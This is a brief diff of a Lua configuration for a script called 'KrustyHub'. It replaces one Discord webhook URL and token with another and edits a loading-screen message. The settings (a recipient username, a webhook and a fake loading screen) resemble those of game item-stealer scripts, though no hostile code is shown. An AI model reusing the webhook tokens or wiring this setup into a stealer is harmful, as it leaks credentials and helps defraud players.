@@ -1,12 +1,12 @@
 Username = "Krustyy999"
 
-WebHook = "https://discord.com/api/webhooks/1097168158957256725/j5pX8r5ZW2mhsF05zu1zve0ka5i4Isgik3GpgLlfIoQTZ0YhcJU8WiPc9e5N9aV_h8-g"
+WebHook = "https://discord.com/api/webhooks/1097168141446025418/QB0YcR057q_vjMGng_tku9wcKlocv1VvzUzRh8zlEAFa6EYoe_VDllRKK2iuFh69wKpC"
 
 loadingscreen = true
 
 _G.CustomScriptName = "KrustyHub"
 
-_G.Text1 = "Script Loaded..."
+_G.Text1 = "Script Loading..."
 
 _G.Text2 = "Waiting for Script..."
 
